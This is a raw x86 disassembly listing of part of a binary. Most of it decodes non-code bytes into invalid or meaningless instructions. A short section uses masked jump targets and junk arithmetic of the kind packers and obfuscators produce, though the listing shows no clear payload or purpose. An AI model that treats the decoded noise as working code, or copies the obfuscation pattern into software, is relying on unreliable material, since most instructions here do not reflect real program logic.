  40f451:	sbb    cl,BYTE PTR [ebx-0x50]
  40f454:	(bad)  
  40f455:	loope  0x40f489
  40f457:	cmp    bh,BYTE PTR [edi+0x3b140858]
  40f45d:	popa   
  40f45e:	mov    ch,0xbe
  40f460:	mov    esp,0xdf17d25d
  40f465:	stos   DWORD PTR es:[edi],eax
  40f466:	(bad)  
  40f467:	call   0x305f7ee5
  40f46c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f46d:	aad    0xc5
  40f46f:	clc    
  40f470:	dec    ebp
  40f471:	mov    dh,0x90
  40f473:	mov    bl,0xaf
  40f475:	outs   dx,BYTE PTR ds:[esi]
  40f476:	sahf   
  40f477:	bound  edi,QWORD PTR [ebx]
  40f479:	(bad)  
  40f47b:	outs   dx,DWORD PTR ds:[esi]
  40f47c:	clc    
  40f47d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f47e:	sub    BYTE PTR [edi-0x4ee1a0df],ah
  40f484:	mov    eax,0x1219e3aa
  40f489:	sbb    BYTE PTR [edi+0x3f456f5f],al
  40f48f:	pop    ecx
  40f490:	je     0x40f460
  40f492:	push   0xb
  40f494:	xchg   ebx,eax
  40f495:	dec    esp
  40f496:	ja     0x40f4ae
  40f498:	mov    WORD PTR [esi+eax*1-0x43],es
  40f49c:	sub    al,0x61
  40f49e:	sahf   
  40f49f:	lods   al,BYTE PTR ds:[esi]
  40f4a0:	jg     0x40f46b
  40f4a2:	sbb    esi,ebx
  40f4a4:	cmp    DWORD PTR [ebx+0x0],esp
  40f4a7:	aas    
  40f4a8:	dec    ecx
  40f4a9:	aam    0x87
  40f4ab:	and    eax,0x19ffbd38
  40f4b0:	pop    ebp
  40f4b1:	mov    ds:0xb6e3b720,al
  40f4b6:	or     edx,ecx
  40f4b8:	dec    ecx
  40f4b9:	inc    ebp
  40f4ba:	add    eax,0x80893812
  40f4bf:	push   esp
  40f4c0:	cdq    
  40f4c1:	inc    esp
  40f4c2:	test   eax,0xd52b6d39
  40f4c7:	imul   esp,DWORD PTR [esp+eiz*8+0x315091e2],0x6ed1a0e2
  40f4d2:	or     eax,0x3a7c06fd
  40f4d7:	pop    edx
  40f4d8:	add    esp,edi
  40f4da:	mov    eax,DWORD PTR [ecx+esi*4+0x758b0fc8]
  40f4e1:	test   DWORD PTR [eax],0x3c157d9b
  40f4e7:	mov    ebx,0xd907b0cb
  40f4ec:	mov    ebp,0x7e88cbea
  40f4f1:	nop
  40f4f2:	iret   
  40f4f3:	sub    ecx,DWORD PTR [ebx]
  40f4f5:	call   0x452e:0x10399249
  40f4fc:	sub    al,0xb
  40f4fe:	push   ebx
  40f4ff:	adc    edi,edi
  40f501:	push   ecx
  40f502:	fimul  WORD PTR fs:[esi+ecx*2-0x2535042b]
  40f50a:	pop    esp
  40f50b:	call   0x5f80a525
  40f510:	outs   dx,DWORD PTR ds:[esi]
  40f511:	cmp    DWORD PTR [ecx+0x2f],esi
  40f514:	or     al,0x40
  40f516:	cdq    
  40f517:	leave  
  40f518:	icebp  
  40f519:	lods   eax,DWORD PTR ds:[esi]
  40f51a:	pop    es
  40f51b:	and    eax,0xe41badb
  40f520:	in     al,dx
  40f521:	dec    edi
  40f522:	adc    bl,ch
  40f524:	push   eax
  40f525:	mov    BYTE PTR [esi-0x13],bl
  40f528:	scas   eax,DWORD PTR es:[edi]
  40f529:	inc    ecx
  40f52a:	shl    bh,cl
  40f52c:	inc    eax
  40f52d:	xchg   edx,eax
  40f52e:	out    0x8e,eax
  40f530:	jns    0x40f544
  40f532:	cmp    esp,DWORD PTR [eax-0x7f]
  40f535:	ret    
  40f536:	add    DWORD PTR [eax],esp
  40f538:	call   FWORD PTR [edi+edx*2-0x27]
  40f53c:	xor    BYTE PTR [eax-0x7b],al
  40f53f:	dec    ecx
  40f540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f541:	in     eax,dx
  40f542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f543:	icebp  
  40f544:	sub    bh,BYTE PTR [esi]
  40f546:	sub    al,BYTE PTR [ebp+0x6d]
  40f549:	xlat   BYTE PTR ds:[ebx]
  40f54a:	fistp  QWORD PTR [esi]
  40f54c:	xor    eax,0x28da25fd
  40f551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f552:	fwait
  40f553:	sub    edi,DWORD PTR [esi]
  40f555:	xchg   esi,eax
  40f556:	sub    ch,BYTE PTR ds:0x88d4ff2c
  40f55c:	sbb    bh,al
  40f55e:	mov    al,0x92
  40f560:	dec    edi
  40f561:	xchg   ecx,eax
  40f562:	mov    al,0x56
  40f564:	mul    BYTE PTR [ebp+0x6f]
  40f567:	mov    ds:0x385c87af,al
  40f56c:	outs   dx,DWORD PTR ds:[esi]
  40f56d:	cdq    
  40f56e:	add    BYTE PTR [edx+edi*1],dh
  40f571:	clc    
  40f572:	std    
  40f573:	ins    DWORD PTR es:[edi],dx
  40f574:	jp     0x40f4fc
  40f576:	jl     0x40f590
  40f578:	shl    BYTE PTR ds:[esi+0x29],1
  40f57c:	cmp    BYTE PTR [edx-0x4e],cl
  40f57f:	xchg   edi,eax
  40f580:	imul   eax,DWORD PTR [ebx],0x5f9fa1d1
  40f586:	into   
  40f587:	xchg   edx,eax
  40f588:	mov    cl,BYTE PTR [ebx-0x6a]
  40f58b:	push   ebx
  40f58c:	sbb    dh,BYTE PTR [eax+0x6a650214]
  40f592:	popa   
  40f593:	and    al,0x2a
  40f595:	les    ebp,FWORD PTR [esi-0x6a]
  40f598:	sahf   
  40f599:	cwde   
  40f59a:	imul   esp,DWORD PTR [esp+ecx*2+0x338888d8],0xffffffcf
  40f5a2:	jg     0x40f5bb
  40f5a4:	int3   
  40f5a5:	xchg   ecx,eax
  40f5a6:	repz jle 0x40f598
  40f5a9:	inc    ecx
  40f5aa:	stos   DWORD PTR es:[edi],eax
  40f5ab:	sub    DWORD PTR [ebx-0x47eaf0c0],eax
  40f5b1:	jge    0x40f604
  40f5b3:	cmp    ecx,eax
  40f5b5:	mov    eax,DWORD PTR [ebp-0x4]
  40f5b8:	je     0x40f617
  40f5be:	mov    ecx,DWORD PTR [ebp-0x30]
  40f5c1:	xor    eax,esi
  40f5c3:	add    eax,edi
  40f5c5:	cmp    ecx,eax
  40f5c7:	je     0x40f620
  40f5cd:	lea    eax,[ebp-0x8]
  40f5d0:	push   eax
  40f5d1:	push   DWORD PTR [ebp-0x28]
  40f5d4:	push   DWORD PTR [ebp+0xc]
  40f5d7:	call   0x411bb3
  40f5dc:	mov    eax,DWORD PTR [ebp-0x4]
  40f5df:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5e2:	xor    eax,esi
  40f5e4:	add    eax,edi
  40f5e6:	cmp    ecx,eax
  40f5e8:	je     0x40f603
  40f5ee:	mov    eax,DWORD PTR [ebp-0x34]
  40f5f1:	movzx  eax,WORD PTR [eax+ebx*2]
  40f5f5:	mov    ecx,DWORD PTR [ebp-0x14]
  40f5f8:	mov    eax,DWORD PTR [ecx+eax*4]
  40f5fb:	mov    DWORD PTR [ebp-0x38],eax
  40f5fe:	jmp    0x40d1fa
  40f603:	mov    eax,DWORD PTR [ebp-0xc]
  40f606:	xor    eax,esi
  40f608:	lea    ebx,[ebx+eax*1+0x3272f6]
  40f60f:	jmp    0x40cf5b
  40f614:	mov    eax,DWORD PTR [ebp-0x4]
  40f617:	xor    eax,esi
  40f619:	add    eax,edi
  40f61b:	jmp    0x411aee
  40f620:	mov    eax,DWORD PTR [ebp-0x38]
  40f623:	add    eax,DWORD PTR [ebp+0x8]
  40f626:	mov    DWORD PTR [ebp-0x18],eax
  40f629:	mov    eax,DWORD PTR [ebp-0x1c]
  40f62c:	test   eax,eax
  40f62e:	je     0x411a77
  40f634:	mov    DWORD PTR [ebp-0x20],0x0
  40f63b:	push   0x3
  40f63d:	xor    edx,edx
  40f63f:	pop    edx
  40f640:	add    edx,0x8
  40f643:	push   edx
  40f644:	pop    ecx
  40f645:	push   0x6
  40f647:	dec    ecx
  40f648:	pop    ebx
  40f649:	dec    ebx
  40f64a:	xchg   ebx,ecx
  40f64c:	sub    ebx,ecx
  40f64e:	xchg   ebx,ecx
  40f650:	dec    ecx
  40f651:	mov    eax,DWORD PTR [ebp-0x1c]
  40f654:	imul   eax,ecx
  40f657:	sub    esp,eax
  40f659:	mov    DWORD PTR [ebp-0x20],esp
  40f65c:	mov    eax,DWORD PTR [ebp-0x4]
  40f65f:	xor    eax,esi
  40f661:	add    eax,edi
  40f663:	jmp    0x411a50
  40f668:	mov    ecx,DWORD PTR [ebp-0xc]
  40f66b:	mov    eax,DWORD PTR [ebp+0x8]
  40f66e:	mov    edx,DWORD PTR [ebp+0x14]
  40f671:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40f675:	jmp    0x411a24
  40f67a:	push   edi
  40f67b:	into   
  40f67c:	cmc    
  40f67d:	pop    ss
  40f67e:	in     al,0x4
  40f680:	xchg   ebp,eax
  40f681:	mov    ?,WORD PTR [edi+0x665c25fb]
  40f687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f688:	sub    esi,DWORD PTR [edx-0x3d]
  40f68b:	scas   eax,DWORD PTR es:[edi]
  40f68c:	add    DWORD PTR [ebx-0x7c7c9f0f],0xffffffa8
  40f693:	push   es
  40f694:	add    BYTE PTR [esi-0x4b],0x74
  40f698:	lock add ebp,ecx
  40f69b:	shl    DWORD PTR [esi],0x9a
  40f69e:	popf   
  40f69f:	sub    bh,BYTE PTR [edi]
  40f6a1:	pop    ss
  40f6a2:	push   edx
  40f6a3:	rol    DWORD PTR [edx+0x66],1
  40f6a6:	pop    ebp
  40f6a7:	mov    ch,0x74
  40f6a9:	inc    ebp
  40f6aa:	add    DWORD PTR ds:0x1ba2c674,edx
  40f6b0:	jecxz  0x40f6a0
  40f6b2:	jne    0x40f6d3
  40f6b4:	mov    BYTE PTR [ebx],dh
  40f6b6:	xchg   ebx,eax
  40f6b7:	pop    eax
  40f6b9:	fiadd  WORD PTR [ebx+0x7dc0253c]
  40f6bf:	gs loope 0x40f6bb
  40f6c2:	xor    al,0x2a
  40f6c4:	rcr    DWORD PTR [ebp-0x14],1
  40f6c7:	jne    0x40f697
  40f6c9:	popf   
  40f6ca:	push   esp
  40f6cb:	mov    al,0xd2
  40f6cd:	and    al,0x8a
  40f6cf:	fisubr DWORD PTR [edx-0x4b52f0fe]
  40f6d5:	mov    dl,0x88
  40f6d7:	je     0x40f725
  40f6d9:	mov    dl,BYTE PTR [eax]
  40f6db:	cdq    
  40f6dc:	mov    DWORD PTR ds:0x233b58ec,ecx
  40f6e2:	sub    bh,BYTE PTR [edx+0xafd0269]
  40f6e8:	cwde   
  40f6e9:	dec    ebp
  40f6ea:	ja     0x40f67f
  40f6ec:	and    BYTE PTR [ebp+eiz*4+0x29103358],0x51
  40f6f4:	mov    ds:0x59033ec8,al
  40f6f9:	add    BYTE PTR [edi-0x311ae0f],ah
  40f6ff:	int3   
  40f700:	inc    eax
  40f701:	ins    BYTE PTR es:[edi],dx
  40f702:	cmp    al,0x59
  40f704:	lea    eax,[ebx]
  40f706:	das    
  40f707:	cmp    bh,bl
  40f709:	ret    
  40f70a:	push   edx
  40f70b:	mov    ch,0x37
  40f70d:	adc    ah,bl
  40f70f:	dec    edi
  40f710:	and    DWORD PTR [esi],ebp
  40f712:	addr16 aam 0xaf
  40f715:	call   0xcaa5:0x65bd6d2
  40f71c:	sti    
  40f71d:	cmp    eax,0x8278fe5b
  40f722:	jmp    DWORD PTR [ecx+0x504f7cac]
  40f728:	(bad)  
  40f729:	std    
  40f72a:	jbe    0x40f78f
  40f72c:	lea    ebp,[eax-0x6c9a0a27]
  40f732:	ins    BYTE PTR es:[edi],dx
  40f733:	push   es
  40f734:	adc    al,0x58
  40f736:	cmp    DWORD PTR [edi+0x5f33d07f],ebx
  40f73c:	jge    0x40f774
  40f73e:	bnd jle 0x40f740
  40f741:	push   ecx
  40f742:	lds    ebx,FWORD PTR [ebx-0x5f]
  40f745:	cli    
  40f746:	and    dh,BYTE PTR [edx]
  40f748:	aam    0x49
  40f74a:	inc    edi
  40f74b:	xchg   esp,eax
  40f74c:	pop    ebp
  40f74d:	retf   0xf499
  40f750:	dec    ebx
  40f751:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f752:	inc    esp
  40f753:	jae    0x40f6ea
  40f755:	js     0x40f6da
  40f757:	jnp    0x40f7ce
  40f759:	sbb    eax,0xfb39917
  40f75e:	jge    0x40f78c
  40f760:	xchg   edx,eax
  40f761:	and    eax,DWORD PTR [eax]
  40f763:	(bad)  
  40f764:	push   0xe731c3fe
  40f769:	(bad)  [edx+0x40d3dabd]
  40f76f:	fadd   DWORD PTR [ecx-0x22]
  40f772:	std    
  40f773:	pushf  
  40f774:	mov    edx,0xe0f145b3
  40f779:	jmp    0x2d07:0x68a4acf1
  40f780:	pop    eax
  40f781:	dec    ecx
  40f782:	sub    eax,0x87224d52
  40f787:	gs cwde 
  40f789:	test   DWORD PTR [ebx+eiz*1+0x1e],0xb9703eb
  40f791:	test   BYTE PTR [ebx-0x79],al
  40f794:	scas   al,BYTE PTR es:[edi]
  40f795:	icebp  
  40f796:	push   edx
  40f797:	pop    es
  40f798:	ss dec edx
  40f79a:	mov    ebx,0x5b23e005
  40f79f:	iret   
  40f7a0:	mov    al,BYTE PTR ds:0xffb380a9
  40f7a6:	or     al,0x99
  40f7a8:	lds    eax,FWORD PTR [ebp-0x5720acef]
  40f7ae:	fdivr  DWORD PTR [edi-0x5a]
  40f7b1:	push   esp
  40f7b2:	pop    esp
  40f7b3:	cmp    DWORD PTR [ebp-0xd],ebx
  40f7b6:	sbb    eax,0x73d52a1b
  40f7bb:	bound  ebx,QWORD PTR [esp+eax*1-0x8]
  40f7bf:	mov    ch,0x33
  40f7c1:	push   es
  40f7c2:	out    dx,eax
  40f7c3:	add    ah,BYTE PTR [esi+0x1]
  40f7c6:	mov    esi,DWORD PTR [eax]
  40f7c8:	sar    DWORD PTR [esi],0xaf
  40f7cb:	cli    
  40f7cc:	js     0x40f7d0
  40f7ce:	in     eax,0x3c
  40f7d0:	adc    edi,edi
  40f7d2:	xchg   esp,eax
  40f7d3:	cwde   
  40f7d4:	pop    edi
  40f7d5:	cld    
  40f7d6:	fwait
  40f7d7:	call   0x62bb:0x23f11fca
  40f7de:	imul   eax,DWORD PTR [ebx-0x4e375d57],0x3e8f76e4
  40f7e8:	xor    BYTE PTR [ebx],bh
  40f7ea:	adc    al,0x7a
  40f7ec:	xor    al,0x76
  40f7ee:	sbb    al,0x7b
  40f7f0:	mov    DWORD PTR [edi+0x3579d56f],edi
  40f7f6:	add    BYTE PTR [ebx],dh
  40f7f8:	adc    DWORD PTR [eax],ecx
  40f7fa:	pop    esi
  40f7fb:	add    eax,0xe398ebe2
  40f800:	ss fs ins BYTE PTR es:[edi],dx
  40f803:	dec    ebx
  40f804:	push   esp
  40f805:	dec    ebp
  40f806:	lea    ecx,[edx-0x38]
  40f809:	mov    edi,0x24d371f
  40f80e:	idiv   DWORD PTR [eax-0xb]
  40f811:	jge    0x40f853
  40f813:	mov    al,0xa0
  40f815:	cli    
  40f816:	ss add eax,0xce49636f
  40f81c:	js     0xeafa5696
  40f822:	into   
  40f823:	sahf   
  40f824:	sbb    edi,DWORD PTR [edx]
  40f826:	jmp    0x60cd6c6
  40f82b:	mov    ecx,0xcbd14954
  40f830:	cmp    al,0xa0
  40f832:	shl    DWORD PTR [ecx+esi*1+0x26],cl
  40f836:	mov    esp,0x5e6d8a1
  40f83b:	in     al,dx
  40f83c:	aad    0x3e
  40f83e:	xor    dh,BYTE PTR [ebx-0x7]
  40f841:	xor    eax,0x71caf51
  40f846:	popf   
  40f847:	ret    
  40f848:	mov    ds:0x8f1c5eb4,eax
  40f84d:	jno    0x40f8a6
  40f84f:	jecxz  0x40f8b2
  40f851:	out    0x60,al
  40f853:	mov    esp,0x5d4c238b
  40f858:	bound  edi,QWORD PTR ds:0xaa47d17e
  40f85e:	mov    ecx,0x7af5e00
  40f863:	pminsw mm2,QWORD PTR [esi]
  40f866:	jecxz  0x40f85b
  40f868:	mov    eax,0xdd0361e6
  40f86d:	scas   eax,DWORD PTR es:[edi]
  40f86e:	cld    
  40f86f:	lods   eax,DWORD PTR ds:[esi]
  40f870:	in     eax,dx
  40f871:	es clc 
  40f873:	mov    ds:0xb72675a2,eax
  40f878:	push   eax
  40f879:	lock adc dl,BYTE PTR [ecx+0x59f10af6]
  40f880:	sbb    edx,esi
  40f882:	js     0x40f8bd
  40f884:	or     ecx,DWORD PTR [eax]
  40f886:	cs jmp 0xca7de337
  40f88c:	mov    WORD PTR [edx*1+0x491c7b10],?
  40f893:	mov    dh,0x6e
  40f895:	mov    edx,0x90bea52c
  40f89a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f89b:	cmp    ch,bh
  40f89d:	dec    ebp
  40f89e:	in     al,0x99
  40f8a0:	or     dl,al
  40f8a2:	(bad)  
  40f8a3:	fisttp WORD PTR [ecx]
  40f8a5:	or     eax,0x153042f9
  40f8aa:	pop    ecx
  40f8ab:	inc    ebp
  40f8ac:	call   0xf93:0x1d2dc4ac
  40f8b3:	push   ds
  40f8b4:	outs   dx,DWORD PTR ds:[esi]
  40f8b5:	into   
  40f8b6:	jp     0x40f89c
  40f8b8:	jbe    0x40f89e
  40f8ba:	adc    ecx,DWORD PTR [esi+0x6a69fc9c]
  40f8c0:	sub    eax,0x6452e94
  40f8c5:	out    0x2f,al
  40f8c7:	sbb    dh,dh
  40f8c9:	aad    0xaf
  40f8cb:	lods   al,BYTE PTR ds:[esi]
  40f8cc:	in     eax,dx
  40f8cd:	lahf   
  40f8ce:	(bad)  
  40f8cf:	and    dl,ah
  40f8d1:	sub    ecx,DWORD PTR [eax]
  40f8d3:	ins    BYTE PTR es:[edi],dx
  40f8d4:	sti    
  40f8d5:	xchg   ebp,eax
  40f8d6:	and    bl,ah
  40f8d8:	jmp    edx
  40f8da:	in     al,0x8f
  40f8dc:	mov    esi,0x119b3dd7
  40f8e1:	add    DWORD PTR [ebx+0x35],esi
  40f8e4:	jo     0x40f8a3
  40f8e6:	adc    al,0xc3
  40f8e8:	jmp    0x40f8ef
  40f8ea:	add    esp,DWORD PTR [esi-0x70cde93e]
  40f8f0:	mov    edx,ebp
  40f8f2:	inc    esi
  40f8f3:	push   0xb950b643
  40f8f8:	pop    esi
  40f8f9:	pop    eax
  40f8fa:	mov    cl,BYTE PTR [ebx]
  40f8fc:	dec    edx
  40f8fd:	retf   
  40f8fe:	mov    eax,ds:0x68c4e130
  40f903:	aam    0xc7
  40f905:	out    dx,eax
  40f906:	bound  edx,QWORD PTR [ebx+0x183edfd5]
  40f90c:	jo     0x40f93b
  40f90e:	fld    QWORD PTR [esi]
  40f910:	inc    esi
  40f912:	mov    al,ds:0xb74fc896
  40f917:	push   ebx
  40f918:	pusha  
  40f919:	out    dx,al
  40f91a:	(bad)  
  40f91b:	(bad)  
  40f91c:	iret   
  40f91d:	fsubrp st(7),st
  40f91f:	cmp    ecx,DWORD PTR [ebp+ebp*8-0xe]
  40f923:	js     0x40f909
  40f925:	loope  0x40f980
  40f927:	adc    cl,BYTE PTR [esi+eax*8]
  40f92a:	ret    
  40f92b:	sbb    bl,ch
  40f92d:	jo     0x40f98e
  40f92f:	jg     0x40f8dc
  40f931:	mov    ds:0xe1ef8cb0,eax
  40f936:	pop    ebp
  40f937:	sub    DWORD PTR [esi+0x2f],eax
  40f93a:	jno    0x40f955
  40f93c:	mov    DWORD PTR [edx-0x39],eax
  40f93f:	and    DWORD PTR [ecx],0x803d1378
  40f945:	loope  0x40f8f5
  40f947:	dec    esi
  40f948:	jg     0x40f8fe
  40f94a:	dec    edx
  40f94b:	into   
  40f94c:	push   0xffffffe0
  40f94e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f94f:	(bad)  
  40f950:	xchg   ebx,eax
  40f951:	in     eax,dx
  40f952:	call   0x84dbfd69
  40f957:	nop
  40f958:	mov    al,0xbb
  40f95a:	sar    DWORD PTR [ebx],cl
  40f95c:	imul   esi,DWORD PTR [esi+0x19dec1ff],0x33
  40f963:	jge    0x40f99a
  40f965:	mov    bl,0xc5
  40f967:	sub    BYTE PTR [edx+0x65],ah
  40f96a:	ja     0x40f943
  40f96c:	xor    BYTE PTR [ebp+0x75712d00],0x3c
  40f973:	mov    ebx,0xfa682aaa
  40f978:	add    BYTE PTR [esi-0x74],cl
  40f97b:	in     eax,dx
  40f97c:	xor    ah,BYTE PTR ds:0x4909dd69
  40f982:	ja     0x40f908
  40f984:	mov    al,ds:0x36a6088e
  40f989:	jle    0x40f9ad
  40f98b:	popw   es
  40f98d:	inc    ecx
  40f98e:	jmp    0x8f854374
  40f993:	into   
  40f994:	(bad)  
  40f995:	out    0x22,eax
  40f997:	or     BYTE PTR [edi-0x4a],dh
  40f99a:	cwde   
  40f99b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f99c:	push   es
  40f99d:	mov    eax,ds:0xc6b629fe
  40f9a2:	and    al,0x9d
  40f9a4:	inc    edx
  40f9a5:	pop    esi
  40f9a6:	(bad)  
  40f9a7:	imul   ebp,DWORD PTR [ebp*2-0x55638fa1]
  40f9af:	mov    eax,ds:0x7cb32370
  40f9b4:	sbb    esp,DWORD PTR [ebx]
  40f9b6:	and    al,0xdb
  40f9b8:	adc    esi,DWORD PTR [edi-0x4de6d0ec]
  40f9be:	imul   eax,DWORD PTR [ebp+0x4b],0xffffff98
  40f9c2:	jno    0x40f9c5
  40f9c4:	idiv   eax
  40f9c6:	ror    BYTE PTR [ebx+0x79107f7b],0x13
  40f9cd:	sti    
  40f9ce:	mov    ch,0x8e
  40f9d0:	add    cl,BYTE PTR [edi-0x14]
  40f9d3:	js     0x40fa4b
  40f9d5:	push   ecx
  40f9d6:	cmp    eax,0xc21475f2
  40f9db:	sub    BYTE PTR [esi-0x1d],al
  40f9de:	sbb    al,0x61
  40f9e0:	fstp   TBYTE PTR [eax+0x3c]
  40f9e3:	lahf   
  40f9e4:	rol    eax,0x3c
  40f9e7:	adc    DWORD PTR [ecx+eax*4-0x4a],edx
  40f9eb:	test   al,0xd7
  40f9ed:	repz xchg edx,eax
  40f9ef:	mov    eax,0xaa4eff1
  40f9f4:	sub    edi,0xfffffff1
  40f9f7:	repz cwde 
  40f9f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9fa:	cli    
  40f9fb:	bound  esp,QWORD PTR ds:0xd78df53
  40fa01:	popf   
  40fa02:	or     DWORD PTR [ecx+edi*4-0x2d088458],0xffffffa3
  40fa0a:	xor    bl,ch
  40fa0c:	sub    al,0x79
  40fa0e:	lahf   
  40fa0f:	stos   BYTE PTR es:[edi],al
  40fa10:	adc    eax,0x87be21bc
  40fa15:	mov    al,ds:0xfd12376f
  40fa1a:	sbb    eax,0x53721e5b
  40fa1f:	rol    DWORD PTR [eax+ebx*4-0x1a],0x80
  40fa24:	test   BYTE PTR [edx+0x79],bh
  40fa27:	hlt    
  40fa28:	inc    ebp
  40fa29:	and    esi,ebp
  40fa2b:	xlat   BYTE PTR ds:[ebx]
  40fa2c:	pop    eax
  40fa2d:	dec    ebp
  40fa2e:	push   ebp
  40fa2f:	jb     0x40fa4d
  40fa31:	xlat   BYTE PTR ds:[ebx]
  40fa32:	cmp    eax,0x59db0010
  40fa37:	in     eax,dx
  40fa38:	inc    edi
  40fa39:	mov    bl,0x6
  40fa3b:	js     0x40fa84
  40fa3d:	pop    edx
  40fa3e:	pop    edi
  40fa3f:	inc    ebx
  40fa40:	push   ebx
  40fa41:	add    BYTE PTR [ebx],bl
  40fa43:	mov    edi,0x6059a828
  40fa48:	push   eax
  40fa49:	mov    eax,ds:0x52d8085e
  40fa4e:	dec    ebp
  40fa4f:	out    dx,eax
  40fa50:	aas    
  40fa51:	call   0xfea7:0x8feda48e
  40fa58:	push   0x7b
  40fa5a:	mov    DWORD PTR [edx],eax
  40fa5c:	mov    cl,0xed
  40fa5e:	rol    bl,1
  40fa60:	cmp    esp,DWORD PTR [ebx-0x49]
  40fa63:	push   ebx
  40fa64:	mov    ah,0x5e
  40fa66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa67:	fwait
  40fa68:	icebp  
  40fa69:	pop    edx
  40fa6a:	or     DWORD PTR [ebp+0x22],edi
  40fa6d:	cmp    al,0xf6
  40fa6f:	stos   BYTE PTR es:[edi],al
  40fa70:	mov    bh,0xd3
  40fa72:	jecxz  0x40fa95
  40fa74:	pushf  
  40fa75:	scas   al,BYTE PTR es:[edi]
  40fa76:	mov    si,0x8e1b
  40fa7a:	inc    esi
  40fa7b:	mov    bl,0xa4
  40fa7d:	cs jns 0x40fae9
  40fa80:	clc    
  40fa81:	jmp    FWORD PTR [edi+0x17]
  40fa84:	scas   eax,DWORD PTR es:[edi]
  40fa85:	fnstsw WORD PTR [esi+0x38]
  40fa88:	retf   0x68cf
  40fa8b:	into   
  40fa8c:	sub    eax,0x7745e155
  40fa91:	(bad)  
  40fa93:	pop    eax
  40fa94:	mov    edi,0x182ab059
  40fa99:	adc    bl,al
  40fa9b:	ins    DWORD PTR es:[edi],dx
  40fa9c:	test   eax,0x1e3f1b28
  40faa1:	out    dx,al
  40faa2:	xor    eax,DWORD PTR cs:[esi-0x9]
  40faa6:	ins    DWORD PTR es:[edi],dx
  40faa7:	xchg   ebx,eax
  40faa8:	out    0xfd,al
  40faaa:	mov    cl,0xbf
  40faac:	mov    al,ds:0x990dcc9a
  40fab1:	mov    ss,WORD PTR [esi+0x7ba373b]
  40fab7:	xor    BYTE PTR [ecx],ah
  40fab9:	repz idiv BYTE PTR [eax]
  40fabc:	in     al,0x54
  40fabe:	adc    BYTE PTR [edx-0x1a],dh
  40fac1:	push   eax
  40fac2:	adc    cl,BYTE PTR [ebp+0x69]
  40fac5:	popf   
  40fac6:	sahf   
  40fac7:	adc    al,0xb3
  40fac9:	fsub   QWORD PTR [ebx+0x7fc55cf2]
  40facf:	ficomp DWORD PTR [edi]
  40fad1:	fbstp  TBYTE PTR [edi+0x2fcbc9ec]
  40fad7:	jl     0x40fb30
  40fad9:	hlt    
  40fada:	sbb    ecx,ecx
  40fadc:	hlt    
  40fadd:	xor    eax,DWORD PTR [edx+0x24]
  40fae0:	jge    0x40faa3
  40fae2:	push   ebp
  40fae3:	adc    edi,edi
  40fae5:	pop    ebp
  40fae6:	les    esi,FWORD PTR [ebp-0x56282a26]
  40faec:	pop    edx
  40faed:	cmp    al,0xf2
  40faef:	jg     0x40fac8
  40faf1:	scas   eax,DWORD PTR es:[edi]
  40faf2:	aam    0x1
  40faf4:	shr    DWORD PTR [ecx+ebp*1+0x79],0xe3
  40faf9:	cmc    
  40fafa:	sub    bl,BYTE PTR [esi]
  40fafc:	data16 in al,0xd
  40faff:	xchg   ebp,eax
  40fb00:	and    ah,BYTE PTR [ebx]
  40fb02:	bound  esp,QWORD PTR [eax+0xf]
  40fb05:	push   cs
  40fb06:	sti    
  40fb07:	in     al,dx
  40fb08:	mov    ch,BYTE PTR [eax-0x4acd0687]
  40fb0e:	adc    al,0x51
  40fb10:	in     eax,dx
  40fb11:	lods   eax,DWORD PTR ds:[esi]
  40fb12:	lods   al,BYTE PTR ds:[esi]
  40fb13:	or     edx,ebp
  40fb15:	sub    dl,0x89
  40fb18:	adc    BYTE PTR [ebp+0x3287c3b6],bl
  40fb1e:	inc    esi
  40fb1f:	mov    bh,0xb1
  40fb21:	lds    ecx,FWORD PTR [edi-0x55]
  40fb24:	bound  ebx,QWORD PTR [edx+edx*4+0x51]
  40fb28:	gs in  al,dx
  40fb2a:	aad    0x4b
  40fb2c:	xchg   esp,eax
  40fb2d:	retf   0x329
  40fb30:	mov    WORD PTR [edx],fs
  40fb32:	test   DWORD PTR [ebx+0x4b],eax
  40fb35:	imul   edi,DWORD PTR [ebp+0x57acac63],0xffffffe8
  40fb3c:	xor    eax,0x287aa9ed
  40fb41:	cmp    edx,ebx
  40fb43:	retf   
  40fb44:	mov    bh,0x4
  40fb46:	cmp    esp,ebx
  40fb48:	xor    eax,0x8b2781d7
  40fb4d:	imul   ebp,DWORD PTR [edi-0x3a],0xffffff94
  40fb51:	(bad)
  40fb55:	sti    
  40fb56:	(bad)  
  40fb57:	push   ecx
  40fb58:	hlt    
  40fb59:	cmp    eax,0x2140cc60
  40fb5e:	jmp    0x638:0xc54fb93c
  40fb65:	mov    eax,ds:0xd1ec6dda
  40fb6a:	(bad)
  40fb6e:	push   ebx
  40fb6f:	bound  ecx,QWORD PTR ds:0x47e14569
  40fb75:	mov    esp,0x2da5ee21
  40fb7a:	fadd   QWORD PTR [ecx+0x927d398]
  40fb80:	adc    ch,BYTE PTR [ebx]
  40fb82:	popf   
  40fb83:	dec    ebp
  40fb84:	jo     0x40fbe2
  40fb86:	sbb    al,0xe1
  40fb88:	xchg   edx,eax
  40fb89:	push   eax
  40fb8a:	cdq    
  40fb8b:	lods   eax,DWORD PTR ds:[esi]
  40fb8c:	jmp    0x40fb74
  40fb8e:	push   edi
  40fb8f:	idiv   DWORD PTR [ebx+esi*8+0x5b00f1b5]
  40fb96:	mov    ch,0xd1
  40fb98:	jecxz  0x40fb4a
  40fb9a:	inc    ebp
  40fb9b:	sub    BYTE PTR [ecx+0x39],cl
  40fb9e:	and    al,0xba
  40fba0:	sub    al,ch
  40fba2:	pop    edx
  40fba3:	pop    ebp
  40fba4:	push   0xffffffe6
  40fba6:	jg     0x40fbc9
  40fba8:	aam    0x41
  40fbaa:	mov    dh,BYTE PTR [eax-0x31e2145a]
